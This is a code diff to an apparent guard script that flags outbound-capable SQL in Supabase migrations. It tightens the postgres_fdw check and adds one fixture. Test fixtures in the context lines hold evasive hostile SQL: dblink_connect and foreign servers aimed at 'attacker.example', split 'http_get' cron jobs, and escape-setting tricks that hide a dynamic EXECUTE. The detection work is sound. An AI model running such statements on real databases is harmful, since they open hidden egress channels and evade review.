@@ -606,7 +606,10 @@ function hasAiRuntimeBoundary(content, path = "") {
     || sqlStructuralTokens(sqlLexicalContent).some((token) => token.type === "string" && token.value.toLowerCase() === "cron")
   );
   const hasExternalDatabaseCapability = normalizedPath.endsWith(".sql")
-    && sqlTokens.some((token) => token.replace(/^quoted:/, "").startsWith("dblink") || token.replace(/^quoted:/, "") === "postgres_fdw");
+    && sqlTokens.some((token) => {
+      const identifier = token.replace(/^quoted:/, "");
+      return identifier.startsWith("dblink") || identifier.startsWith("postgres_fdw");
+    });
   const hasAdjacentSqlStrings = normalizedPath.endsWith(".sql") && /(?:^|[\s(])(?:E|U&)?'(?:[^']|'')*'\s*(?:\r?\n|\r)[ \t]*(?:E|U&)?'/im.test(sqlLexicalContent);
   const approvedEgressHosts = new Set([
     "api.github.com",
@@ -792,6 +795,7 @@ for (const fixture of [
   { content: "set search_path to 'cron'; insert into job (schedule, command) values ('* * * * *', 'select extensions.ht' || 'tp_get(...)');", path: "supabase/migrations/99999999999999-cron-search-path-job-outbound.sql" },
   { content: "create extension dblink; select dblink_connect('host=attacker.example dbname=hidden');", path: "supabase/migrations/99999999999999-dblink-outbound.sql" },
   { content: "create extension postgres_fdw; create server hidden foreign data wrapper postgres_fdw options (host 'attacker.example');", path: "supabase/migrations/99999999999999-postgres-fdw-outbound.sql" },
+  { content: "create foreign data wrapper hidden handler extensions.postgres_fdw_handler validator extensions.postgres_fdw_validator;", path: "supabase/migrations/99999999999999-postgres-fdw-handler-outbound.sql" },
   { content: "alter role current_user set standard_conforming_strings to off;", path: "supabase/migrations/99999999999999-alter-role-legacy-escape.sql" },
   { content: "alter database meccha_manual set standard_conforming_strings = 'off';", path: "supabase/migrations/99999999999999-alter-database-legacy-escape.sql" },
   { content: "select set_config('standard_conforming_strings', 'off', false); create function public.dynamic_outbound() returns void as 'begin EX\\ECUTE ''select extensions.ht'' || ''tp_get(...)''; end' language plpgsql;", path: "supabase/migrations/99999999999999-legacy-set-config-body-outbound.sql" },
